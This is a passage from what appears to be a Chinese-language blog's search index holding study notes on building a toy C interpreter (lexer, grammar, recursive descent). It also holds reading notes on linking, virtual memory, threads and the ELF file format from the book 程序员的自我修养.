class="keyword">int</span> token;<span class="comment">// 该标识符返回的标记</span></span><br><span class="line">    <span class="keyword">int</span> hash;<span class="comment">// 标识符的hash值，用于标识符的比较</span></span><br><span class="line">    <span class="keyword">char</span> * name;<span class="comment">// 存放标识符本身的字符串</span></span><br><span class="line">    <span class="keyword">int</span> <span class="class"><span class="keyword">class</span>;</span><span class="comment">// 标识符的类别，如数字，全局变量等</span></span><br><span class="line">    <span class="keyword">int</span> type;<span class="comment">// 标识符的类型，int，char等</span></span><br><span class="line">    <span class="keyword">int</span> value;<span class="comment">// 存放标识符的值，如果是标识符是函数，就存放函数的地址</span></span><br><span class="line">    <span class="keyword">int</span> Bclass;<span class="comment">//当全局变量和局部变量的标识符相同时，</span></span><br><span class="line">    <span class="keyword">int</span> Btype;<span class="comment">//B开头的保存全局标识符的信息</span></span><br><span class="line">    <span class="keyword">int</span> Bvalue;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后代码的主要就是通过分析来确定标记。对于关键字if,while,return等等，我们把它们加入符号表</p><ol><li>词法分析器的作用是对源码字符串进行预处理，作用是减小语法分析器的复杂程度。</li><li>词法分析器本身可以认为是一个编译器，输入是源码，输出是标记流。</li><li><code>lookahead(k)</code>的概念，即向前看<code>k</code>个字符或标记。</li><li>词法分析是怎么处理标识符与符号表的。</li></ol><p><strong>lookahead</strong>：如果有多个标记是以同样的字符开头的，凭借当前的字符我们无法确定具体解释成哪一个标记，所以我们只能向前查看字符判断解释的标记。</p><h1 id="0x04-语法分析器"><a href="#0x04-语法分析器" class="headerlink" title="0x04 语法分析器"></a>0x04 语法分析器</h1><h2 id="终结符与非终结符"><a href="#终结符与非终结符" class="headerlink" title="终结符与非终结符"></a>终结符与非终结符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;expr&gt; ::= &lt;expr&gt; + &lt;term&gt;</span><br><span class="line">         | &lt;expr&gt; - &lt;term&gt;</span><br><span class="line">         | &lt;term&gt;</span><br><span class="line"></span><br><span class="line">&lt;term&gt; ::= &lt;term&gt; * &lt;factor&gt;</span><br><span class="line">         | &lt;term&gt; / &lt;factor&gt;</span><br><span class="line">         | &lt;factor&gt;</span><br><span class="line"></span><br><span class="line">&lt;factor&gt; ::= ( &lt;expr&gt; )</span><br><span class="line">           | Num</span><br></pre></td></tr></table></figure><p>用尖括号<code>&lt;&gt;</code>括起来的就是<strong>非终结符</strong>，因为它们可以用<code>::=</code>右边的式子代替。<code>|</code>的意思是<code>或</code>，比如说：expr中那三个式子都可以替换expr。</p><p>没出现在<code>::=</code>左边的就是<strong>终结符</strong>，终结符一般对应词法分析器输出的标记。</p><h2 id="递归下降"><a href="#递归下降" class="headerlink" title="递归下降"></a>递归下降</h2><p>编写语法分析器有两种方法，一种是从起始非终结符开始，不断把非终结符分解，直到匹配输入的终结符；另一种是把终结符不断合并，直到合成非终结符。</p><p>我们用的是第二种，也就是递归下降。</p><p>它的过程是:</p><p><img src="https://i.loli.net/2021/05/13/PmXfl7dcMh3uCjo.png" alt="image-20210513134524566"></p><p>再后面就是将语句等编译成汇编代码了</p><h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><p>语句：语句就是表达式加上<code>;</code>。</p><p>我们的编译器中识别6种语句：</p><ol><li><code>if (...) &lt;statement&gt; [else &lt;statement&gt;]</code></li><li><code>while (...) &lt;statement&gt;</code></li><li><code>&#123; &lt;statement&gt; &#125;</code></li><li><code>return xxx;</code></li><li><code>&lt;empty statement&gt;</code>;</li><li><code>expression;</code> (expression end with semicolon)</li></ol><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (...) &lt;statement&gt; [<span class="keyword">else</span> &lt;statement&gt;]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (&lt;cond&gt;)                   &lt;cond&gt;</span><br><span class="line">                                JZ a</span><br><span class="line">    &lt;true_statement&gt;   ===&gt;     &lt;true_statement&gt;</span><br><span class="line">  <span class="keyword">else</span>:                         JMP b</span><br><span class="line">a:                           a:</span><br><span class="line">    &lt;false_statement&gt;           &lt;false_statement&gt;</span><br><span class="line">b:                           b:</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (token == If) &#123;</span><br><span class="line">    <span class="built_in">match</span>(If);</span><br><span class="line">    <span class="built_in">match</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">    <span class="built_in">expression</span>(Assign);  <span class="comment">// parse condition</span></span><br><span class="line">    <span class="built_in">match</span>(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    *++text = JZ;</span><br><span class="line">    b = ++text;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">statement</span>();         <span class="comment">// parse statement</span></span><br><span class="line">    <span class="keyword">if</span> (token == Else) &#123; <span class="comment">// parse else</span></span><br><span class="line">        <span class="built_in">match</span>(Else);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// emit code for JMP B</span></span><br><span class="line">        *b = (<span class="keyword">int</span>)(text + <span class="number">3</span>);</span><br><span class="line">        *++text = JMP;</span><br><span class="line">        b = ++text;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">statement</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *b = (<span class="keyword">int</span>)(text + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有if，while，return生成汇编代码。其余不生成。</p><blockquote><p>match函数用于比较token是否正确，如果不正确就会报错退出。</p></blockquote><p>解析表达式主要是实现运算符优先级这里麻烦一些。</p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>回答一下我开这个坑的疑问：编写编译器(不，这是解释器)的过程大概是怎样的。</p><p>答：</p><ol><li>首先我们要写一个虚拟机，里面划分堆栈段。然后写出基本的寄存器。</li><li>再然后要制作我们自己的指令集。我们可以把代码转换成汇编，然后存放在虚拟机的text段。</li><li>然后就是写词法分析器，它会把源码修改成标记，为了方便语法分析器。</li><li>到了语法分析器，<code>3*4</code>可能就已经被修改成了<code>num1 Mul num2</code>。</li><li>最后需要把这些变成汇编语言就可以了。</li></ol><p>代码就先不写了，因为目前用不到。可能以后深入的话，学点更难的。</p><p>另外我是懒狗，如果想要学好点的话，最好把代码抄一遍()</p>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[读书笔记] 程序员的自我修养</title>
      <link href="/2021/03/08/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
      <url>/2021/03/08/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h1><p>这里照例是不知道写些什么的</p><p>不过放个蛮不错的思维导图，看书的时候可以用来辅助，找找自己的遗漏</p><p><a href="https://zhuanlan.zhihu.com/p/111682188">https://zhuanlan.zhihu.com/p/111682188</a></p><p><a href="https://zhuanlan.zhihu.com/p/138345701">https://zhuanlan.zhihu.com/p/138345701</a></p><h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><h2 id="第一章-温故而知新"><a href="#第一章-温故而知新" class="headerlink" title="第一章 温故而知新"></a>第一章 温故而知新</h2><h3 id="A-杂记"><a href="#A-杂记" class="headerlink" title="A.杂记"></a>A.杂记</h3><p>1.早期的计算机结构图：</p><p><img src="https://i.loli.net/2021/03/08/7tJSALsYqEMuivU.png" alt="image-20210308010516828"></p><blockquote><p>这时的计算机CPU频率不高，和内存一样，所以它们可以直接连接在一个总线(Bus)上。其它I/O设备与内存和CPU相比还是差很多，为了协调速度，每个设备会有一个相应的I/O控制器。</p></blockquote><p>这些硬件结构虽然看起来复杂，但实际上还是最初的CPU、内存和I/O设备。</p><p><img src="https://i.loli.net/2021/03/08/uT4v1coxznRtyaw.png" alt="image-20210308011406962"></p><blockquote><p>后来由于CPU核心频率的提升，导致内存跟不上CPU的速度，于是产生了与内存频率一致的系统总线。接着随着图形化操作系统的普及，使得图形芯片需要跟CPU和内存大量交换数据，所以人们设计了一个高速的北桥芯片。<br>又由于北桥运行速度非常高，相对低速的设备如果连接在北桥上，北桥既需处理高速设备，又需处理低速设备，设计就会变得十分复杂，于是人们又设计了专门处理低速设备的南桥芯片，由南桥芯片把低速设备汇总后，连接到北桥上。20世纪90年代的PC机在系统总线上采用的是PCI结构，而在低速设备上用的是ISA总线。</p></blockquote><p>2.计算机体系结构</p><p><img src="https://i.loli.net/2021/03/08/Fv8BciZAUVIkbN9.png" alt="image-20210308012450449"></p><p>这个就是上层用下层提供的接口api，来完成对下层的操作。例如此图的操作系统内核层，对于硬件层来说就是硬件接口的使用者，而硬件是接口的定义者，这种接口被称作硬件规格。</p><p>3.我们想要充分利用CPU，所以编写了一个监控程序，当计算机中某程序不需要使用CPU时，监控程序就把另外等待CPU资源的程序启动，让CPU能充分利用起来。这种被称为<strong>多道程序</strong>，虽然能提高CPU的利用率，但是程序之间不分轻重缓急，例如如果我们点击鼠标，程序等了10分钟才有反应。<br>经过改进，程序运行模式变成了每个程序都运行一小段时间，这对于一些交互式任务尤为重要，例如点击一下鼠标或按一下键盘。这种模式叫做<strong>分时系统</strong>。windows3.1中，程序会判断是否有其他程序正在等待CPU，如果有，则可能暂停当前的程序，把CPU让出来给其他的程序。但是如果运行一个很耗时的程序时，操作系统没办法，其他程序只能等待。<br>大多数的现代操作系统用的是<strong>多任务系统</strong>，所有的应用程序以<strong>进程</strong>的方式运行在比操作系统权限更低的级别，每个进程都有自己独立的地址空间，相互隔离。CPU由操作系统统一分配，根据优先级的高低都有机会得到CPU。当运行时间超出了一定的时间，操作系统会暂停进程，把CPU资源分配给别的进程，这种CPU的分配方式就是所谓的<strong>抢占式</strong>，操作系统可以强制剥夺CPU资源并且分配给它认为目前最需要的进程。</p><p>4.操作系统出现后，硬件逐渐被抽象成了一系列概念。程序员可以从硬件细节中解放出来，更多关注应用程序本身的开发，繁琐的硬件细节交给了操作系统中的<strong>硬件驱动程序</strong>来完成。这些驱动通常由硬件厂商完成，操作系统为硬件生产厂商提供了接口和框架。</p><h3 id="B-虚拟内存"><a href="#B-虚拟内存" class="headerlink" title="B.虚拟内存"></a>B.虚拟内存</h3><p>早期的计算机中，程序是直接运行在物理内存上的。这样会出现几个问题：</p><ul><li><strong>地址空间不隔离</strong> 恶意的程序可以很容易改写其他程序的内存数据，一个任务崩溃，可能会影响到其他任务；</li><li><strong>内存使用效率低</strong> 因为程序需要的空间是连续的，如果程序A正在运行，我们运行程序B时内存不够，需要把程序A换到磁盘，再读取B到内存开始运行。</li><li><strong>程序运行的地址不确定</strong> 因为程序在编写时，它访问数据和指令跳转时的目标地址都是固定的。</li></ul><p>虚拟地址空间是指虚拟的，人们想象出来的地址空间，其实它并不存在。每个进程都有自己独立的虚拟空间，而且每个进程只能访问自己的地址空间，这样有效地做到了进程的隔离。</p><p><strong>分段</strong>：</p><p>分段的基本思路是虚拟出一块地址空间，然后我们把物理地址映射到这段虚拟地址空间中，这个映射由软件来设置，比如操作系统来设置这个映射函数，实际的地址转换则由硬件完成。<br>分段这种方法解决了隔离的问题，如果程序访问虚拟空间的地址超过了范围，硬件就会判断这是一个非法请求，拒绝请求并报告给操作系统或者监控程序，由它处理。<br>同时也解决了地址不确定的问题，因为程序只需要按照虚拟地址空间来进行编写程序即可。<br>但是这种方法还是没解决第二个问题。但实际上，程序在运行时，在某个时间段，只是频繁的用到了一小部分数据。所以人们想到了进行内存分割提高内存使用率，这种方法就是分页。</p><p><strong>分页</strong>：</p><p>分页的基本方法就是把地址空间人为的分成固定大小的页，每一页的大小由硬件决定，或硬件支持多种大小页，由操作系统选择决定页的大小。几乎所有32位PC上的操作系统都用4KB大小的页。物理空间也是同样的分法。</p><p>举个栗子：<br>我们把进程的虚拟地址空间按页分割，把常用的数据和代码页装载到内存中，把不常用的代码和数据保存在磁盘上，用到的时候把它从磁盘中取出来即可。<br>以下图为例，我们假设有两个进程Process1和Process2，它们进程中的部分虚拟页面被映射到了物理页面，比如VP0、VP1和VP7映射到PP0、PP2和PP3；而VP2和VP3位于磁盘的DP0和DP1中；另外VP4、VP5、VP6可能尚未使用或访问，暂时处于未使用的状态。在这里，我们把虚拟空间的页就叫**虚拟页(VP，Virtual Page)<strong>，把物理内存中的页叫做</strong>物理页(PP，Physical Page)<strong>，把磁盘中的页叫做</strong>磁盘页(DP，Disk Page)**。虚拟空间的有些页被映射到了同一个物理页，这样就可以实现内存共享。</p><p>图中Process1的VP2和VP3不在内存中，当进程需要使用这两个页时，硬件会捕获这个消息，这就是所谓的**页错误(Page Fault)**，然后操作系统接管进程，把VP2和VP3从磁盘中读出来装入内存。</p><p><img src="https://i.loli.net/2021/03/11/EA5x1szNlBHK62t.png" alt="image-20210311235942347"></p><p>每个页可以设置权限属性，只有操作系统有权限修改这些属性，这可以做到保护自己和进程。</p><p>几乎所有的硬件都采用MMU(Memory Management Unit)来进行页映射。<br>CPU发出虚拟地址，在CPU转换后(MMU一般集成在CPU内部)变成物理地址。</p><p><img src="https://i.loli.net/2021/03/12/EjHQOw6okbqN8SX.png" alt="image-20210312002436967"></p><h3 id="C-线程"><a href="#C-线程" class="headerlink" title="C.线程"></a>C.线程</h3><p><strong>线程(Thread)<strong>，有时被称为</strong>轻量级进程</strong>，是程序执行流的最小单元。<br>一个标准的线程由线程ID、当前指令指针(PC)、寄存器集合和堆栈组成。<br>通常意义上，一个进程由一个到多个线程组成，各个线程之间共享程序的内存空间和一些进程级的资源(比如打开文件和信号)。</p><p>大多数软件应用中，线程的数量都不止一个，多个线程可以互不干扰地并发执行，使用多线程的优势如下：</p><ul><li>某个操作可能会陷入长时间等待，等待的线程会无法继续执行，多线程可以利用等待时间。</li><li>某个操作会消耗大量时间，如果只有一个线程，程序和用户之间的交互会中断，多线程可以让一个线程负责交互，另一个线程负责计算。</li><li>程序逻辑本身要求并发操作</li><li>多CPU或多核计算机，本身具有执行多个线程的能力，单线程无法全面发挥计算机的计算能力。</li><li>多线程在数据共享方面效率会更高。</li></ul><p>线程的访问非常自由，它可以访问进程内存里的所有数据，甚至包括其他线程的堆栈。在实际运用中线程也有自己的私有存储空间，包括以下几方面</p><ul><li>栈(尽管也可以被其他线程访问，但一般情况下认为是私有数据)</li><li>线程局部存储(Thread Local Storage，TLS)。操作系统为线程提供的很有限的私有空间。</li><li>寄存器(包括PC寄存器)，寄存器是执行流的基本数据，因此为线程私有</li></ul><p><img src="https://i.loli.net/2021/03/12/g7OKMvA8Ibc2Jz9.png" alt="image-20210312005414382"></p><p>线程是并发执行的，在单处理器时用多线程，并发是一种模拟出来的状态，操作系统会让多线程程序轮流执行一小段时间，这样每个线程就看起来同时在执行。这样一个不断在处理器上切换不同线程的行为称之为**线程调度(Thread Schedule)**。</p><p>在优先级调度的环境下，线程的优先级改变一般有三种方式:</p><ul><li>用户指定优先级</li><li>根据进入等待状态的频繁程度提升或降低优先级(频繁需要等待的线程优先级更容易提升，因为只需要占用很少时间)</li><li>长时间得不到执行而被提升优先级</li></ul><p>Linux把线程和进程都称为任务，每一个任务概念上都类似于一个单线程的进程，具有内存空间、执行实体、文件资源等。不过Linux下不同的任务之间可以选择共享内存空间，因此在实际意义上，共享了同一个内存空间的多个任务构成了一个进程，这些任务也就成了这个进程里的线程。</p><p><strong>同步与锁</strong></p><p>为了避免多个线程同时读写同一个数据，我们需要使用<strong>同步</strong>，指在一个线程访问数据未结束时，其他线程不得对同一个数据进行访问。<br>同步最常见的方法是使用<strong>锁(Lock)<strong>。这是一种非强制机制，每一个线程在访问数据或资源之前首先获取锁，并在访问结束之后释放锁。在锁已经被占用的时候，线程会等待到锁重新可用。</strong>二元信号量</strong>就是最简单的一种锁，它只有占用与非占用两种状态。</p><p>对于允许多个线程并发访问的资源，<strong>多元信号量</strong>是一个很好的选择。一个初始值为N的信号量允许N个线程并发访问，当一个线程访问资源获取信号量时，信号量的值就会减一。当访问完资源后，线程释放信号量，信号量的值就会加一。如果信号量的值小于0，则进入等待状态。</p><p>**互斥量(Mutex)**和二元信号量很相似，不过信号量的一个任务申请成功后，可以由另一个任务释放。互斥量则必须由同一个任务释放。</p><p>**临界区(Critical Section)**是比互斥量更严格的同步手段，临界区和互斥量的区别在于，在一个进程获取临界区后，其他进程无法获取该锁。</p><p>**读写锁(Read-Write Lock)**：</p><p><img src="https://i.loli.net/2021/03/13/oKvCbzlBmPpMefx.png" alt="image-20210313011915853"></p><p><strong>条件变量</strong>可以被多个线程等待，线程也可以唤醒条件变量。也就是说，使用条件变量可以让线程一起等待某个事件的发生，当事件发生时，所有的线程一起恢复执行。</p><p>CPU有可能因为过度优化(例如CPU的换序执行)导致代码出问题。为了保证线程安全，阻止CPU换序是必须的。通常方法是调用CPU提供的指令barrier拦住该指令之前的指令交换到barrier的后面去。</p><p><strong>线程的并发执行是由多处理器或操作系统调度来实现的。</strong>但是用户使用的并不是内核线程，而是用户态的用户线程。用户态线程并不一定在操作系统内核里对应同等数量的内核线程，例如某些轻量级的线程库，对用户来说有三个线程在同时执行，对内核来说只有一个。</p><p>用户态多线程库的实现方法：</p><p>1.一对一模型，一个用户态的线程对应一个内核的线程</p><p><img src="https://i.loli.net/2021/03/13/DsJ2QAogqBbCkmI.png" alt="image-20210313014551589"></p><blockquote><p>这样用户线程就具有了和内核线程一致的优点，实现了真正的并发。但这也同时限制了线程数量，以及操作系统内核线程调度时，切换开销大导致的执行效率下降。</p></blockquote><p>2.多对一模型，多个用户态映射到一个内核线程</p><p><img src="https://i.loli.net/2021/03/13/LCSrpuFchJ2dMnR.png" alt="image-20210313014855513"></p><blockquote><p>多对一相比一对一，在线程的切换上要快速许多以及几乎无限制的线程数量。但是如果一个用户线程阻塞，那么所有的线程都无法执行。</p></blockquote><p>3.多对多模型，多个用户态映射到多个内核线程</p><p><img src="https://i.loli.net/2021/03/13/6193TYMizOWRyEI.png" alt="image-20210313015147020"></p><blockquote><p>一个用户线程阻塞不会让所有用户线程阻塞，同时对线程数量没有限制，性能也能得到一定提升，不过不如一对一模型高。</p></blockquote><h1 id="0x02-静态链接"><a href="#0x02-静态链接" class="headerlink" title="0x02 静态链接"></a>0x02 静态链接</h1><h2 id="第二章-编译和链接"><a href="#第二章-编译和链接" class="headerlink" title="第二章 编译和链接"></a>第二章 编译和链接</h2><p>当我们使用gcc编译程序时，编译器进行了如下步骤</p><ol><li><code>预编译</code>主要处理那些源代码中以”#”开始的预编译指令。</li></ol><ul><li>将所有的#define删除，展开宏定义</li><li>处理条件预编译指令</li><li>处理#include，将被包含的文件插入到该预编译指令的位置。</li><li>删除注释</li><li>添加行号和文件名标识，以便于编译时编译器产生调试用的行号信息及用于编译时产生编译错误或警告时能够显示行号。</li><li>保留所有#pragma编译器指令，因为编译器要使用它们。</li></ul><ol start="2"><li><p><code>编译</code>就是将预处理完的文件进行了一系列的语法分析，优化后生产一个汇编代码文件</p></li><li><p><code>汇编</code>是将汇编代码转换成机器指令</p></li><li><p><code>链接</code>把库文件进行了链接</p></li></ol><p>编译过程一般可以分为6步：扫描、语法分析、语义分析、源代码优化、代码生成和目标代码优化。</p><p><img src="https://i.loli.net/2021/03/16/FPaMpcQ5DUrGJTq.png" alt="image-20210316183219598"></p><p><strong>词法分析(扫描)</strong></p><p>扫描器的任务是简单进行词法分析，把源代码的字符序列分割成一系列记号。记号一般分为几类：关键字、 标识符、字面量(包括数字和字符串等)和特殊符号(如加、等号)。</p><p><strong>语法分析</strong></p><p>语法分析器对扫描器产生的记号进行语法分析，从而产生语法树(以表达式为节点的树)。如果出现了表达式不合法，编译器就会报告语法分析阶段的错误。</p><p><strong>语义分析</strong></p><p>编译器能分析的语义是静态语义(指在编译期可以确定的语义，与之对应的动态语义就是只有在运行期才能确定的语义)。</p><p>例如将一个浮点型的表达式转换成整型，语义分析过程中会完成这个步骤。但是将浮点型赋值给指针时，语义分析程序会发现类型不匹配，编译器将会报错。</p><p>经过语义分析后，整个语法树的表达式都被标识了类型(整形，浮点型等等)，如果有些类型需要做隐式转换，语义分析程序会在语法树上插入相应的转换节点。</p><p>另外像2+6这种表达式是可以被直接优化成8的，因为它的值在编译器就可以被确定。</p><p><strong>中间语言生成</strong></p><p>源代码优化器将整个语法树转换成中间代码，它是语法树的顺序表示，且非常接近目标代码。中间代码有很多类型，在不同编译器中有不同的形状。</p><p>中间代码使编译器可以被分为前端和后端，编译器前端负责产生机器无关的中间代码，编译器后端将中间代码转换成目标机器代码。<br>这样的好处是，对于一些可以跨平台的编译器而言，它们可以针对不同的平台使用同一个前端和针对不同机器平台的多个后端。</p><p><strong>目标代码生成与优化</strong></p><p>编译器后端主要包括代码生成器和目标代码优化器。代码生成器把中间代码转换成目标机器代码。代码优化器对目标代码进行优化，比如选择合适的寻址方式，使用位移来代替乘法运算等等。</p><p><strong>链接</strong></p><p>当以上所有操作做完以后，我们会发现某些函数的地址没有确定(在编译时如果有不知道的函数地址，编译器会将地址搁置，等待链接进行修正)。如果这些函数跟源代码在用一个编译单元里，那么编译器可以分配空间确定地址，但是如果定义在其他程序模块里，我们就需要链接器将目标文件链接成可执行文件。</p><p>最基本的静态链接就是将目标文件和库链接成可执行文件。</p><p>当有不确定的函数出现时，程序会将地址置为0，链接后将修正地址，这个修正的过程被称为<strong>重定位</strong>。</p><h2 id="第三章-目标文件里面有什么"><a href="#第三章-目标文件里面有什么" class="headerlink" title="第三章 目标文件里面有什么"></a>第三章 目标文件里面有什么</h2><p>1.现在PC平台流行的可执行文件格式主要是Windows下的PE和Linux下的ELF。它们都是COFF格式的变种。</p><p>2.目标文件(重定向文件)就是源代码编译后未进行链接的中间文件(Windows下的.obj和Linux下的.o)。它跟可执行文件的格式几乎是一样的。我们可以广义地将目标文件和可执行文件看成一种类型的文件。</p><p>3.动态链接库(Windows的.dll和Linux的.so)和静态链接库(Windows的.lib和Linux的.a)文件也按照同一种格式存储。</p><p>4.静态链接库是把很多目标文件捆绑成一个文件，再加上一些索引。可以把它理解为一个包含很多目标文件的文件包。</p><p>5.可执行文件，Windows的demo.exe和Linux的demo。</p><h3 id="A-段"><a href="#A-段" class="headerlink" title="A.段"></a>A.段</h3><p>1.程序源代码编译后的机器指令经常放在代码段(code section)里，代码段常见的名字有”.code”或”.text”；全局变量和局部静态变量数据经常被放在数据段(data section)，数据段常见的名字是”.data”。</p><p>2.未初始化的全局变量和局部静态变量存放在”.bss”段里。未初始化的全局变量和局部静态变量的默认值都为0，本身可以放到data段，但是因为这种值无意义。bss段只是为未初始化的全局变量和局部静态变量预留位置，它没有内容，所以在文件中不占空间，执行时生成虚拟地址空间。</p><blockquote><p>总体来说，程序源代码被编译后主要分成两种段：程序指令和程序数据。代码段属于程序指令，而数据段和.bss段属于程序数据。</p></blockquote><p>3.指令、数据分段的好处：</p><p>a.数据可读写，指令只读，所以分段可以防止指令被有意或无意的改写。</p><p>b.现代CPU的缓存一般设计为数据缓存和指令缓存分离，所以程序的指令和数据分开存放对CPU的缓存命中率提高有好处。</p><p>c.共享指令：当系统中运行着多个该程序的副本时，它们的指令部分都是一样的，所以内存只需要保存一份指令部分即可。当然每个副本进程的数据区域是不一样的，是进程私有的。</p><p><code>ELF常见段</code></p><p><img src="https://i.loli.net/2021/04/10/RQUr1ficVbCZ5ua.png" alt="image-20210410214059957"></p><h3 id="B-ELF文件结构"><a href="#B-ELF文件结构" class="headerlink" title="B.ELF文件结构"></a>B.ELF文件结构</h3><p><img src="https://i.loli.net/2021/04/10/EwgUFT9jtqDp54v.png" alt="image-20210410215140178"></p><ul><li><p>ELF Header描述整个文件的基本属性，Section Header Table描述了ELF文件包含的所有段的信息。</p></li><li><p>我们可以用<code>readelf</code>命令查看ELF文件</p></li><li><p>elf文件头结构及相关常数被定义在<code>/usr/include/elf.h</code>里，有32位和64位两个版本</p></li></ul><p>elf的自定义宽度:</p><p><img src="https://i.loli.net/2021/04/10/Ra3QuFWVCqNHGef.png" alt="image-20210410221150057"></p><p>32位的ELF Header的定义如下:</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[<span class="number">16</span>];</span><br><span class="line">    Elf32_Half e_type;<span class="comment">//ELF文件类型</span></span><br><span class="line">    Elf32_Half e_machine;<span class="comment">//CPU属性</span></span><br><span class="line">Elf32_Word e_version;<span class="comment">//ELF版本，一般为常数1</span></span><br><span class="line">Elf32_Addr e_entry;<span class="comment">//入口地址，规定ELF程序的入口虚拟地址，操作系统从这个地址开始执行指令。可重定位文件一般没有入口地址，值为0</span></span><br><span class="line">Elf32_Off e_phoff;</span><br><span class="line">Elf32_Off e_shoff;<span class="comment">//节表在文件中的偏移</span></span><br><span class="line">Elf32_Word e_flags;<span class="comment">//ELF标志位</span></span><br><span class="line">Elf32_Half e_ehsize;<span class="comment">//ELF文件头的大小</span></span><br><span class="line">Elf32_Half e_phentsize;</span><br><span class="line">Elf32_Half e_phnum;</span><br><span class="line">Elf32_Half e_shentsize;<span class="comment">//节表描述符大小</span></span><br><span class="line">Elf32_Half e_shnum;<span class="comment">//节表数量</span></span><br><span class="line">Elf32_Half e_shstrndx;<span class="comment">//字符串表所在的段，在节表中的下标</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e_ident&#123;</span><br><span class="line">    Magic: <span class="number">7f</span> <span class="number">45</span> <span class="number">4</span>c <span class="number">46</span></span><br><span class="line">    Class: 标识ELF文件类型，<span class="number">0x01</span>是<span class="number">32</span>位，<span class="number">0x02</span>是<span class="number">64</span>位</span><br><span class="line">    Data: 规定大端序还是小端序</span><br><span class="line">    Version: 规定ELF版本号，一般是<span class="number">1</span></span><br><span class="line">    OS/ABI: 没有意义一般为<span class="number">0</span></span><br><span class="line">    ABI Version: 没有意义一般为<span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>Magic</code>前4个字节是所有ELF文件都必须相同的标识码</p></blockquote><p><code>e_type</code>:</p><p><img src="https://i.loli.net/2021/04/10/OeoYIDiPb7QjcXM.png" alt="image-20210410232756674"></p><p><code>e_machine</code>:</p><p><img src="https://i.loli.net/2021/04/10/RoJ39dX6CAi8MqL.png" alt="image-20210410232908693"></p><p>&lt;————————————分割线————————————&gt;</p><p>Section Header Table就是描述节的基本属性的结构。</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word sh_name;<span class="comment">//段名</span></span><br><span class="line">    Elf32_Word sh_type;<span class="comment">//段的类型</span></span><br><span class="line">    Elf32_Word sh_flags;<span class="comment">//段的标志位</span></span><br><span class="line">    Elf32_Addr sh_addr;<span class="comment">//段的虚拟地址</span></span><br><span class="line">    Elf32_Off sh_offset;<span class="comment">//段的文件偏移</span></span><br><span class="line">    Elf32_Word sh_size;<span class="comment">//段的长度</span></span><br><span class="line">    Elf32_Word sh_link;<span class="comment">//段链接信息</span></span><br><span class="line">    Elf32_Word sh_info;<span class="comment">//段链接信息</span></span><br><span class="line">    Elf32_Word 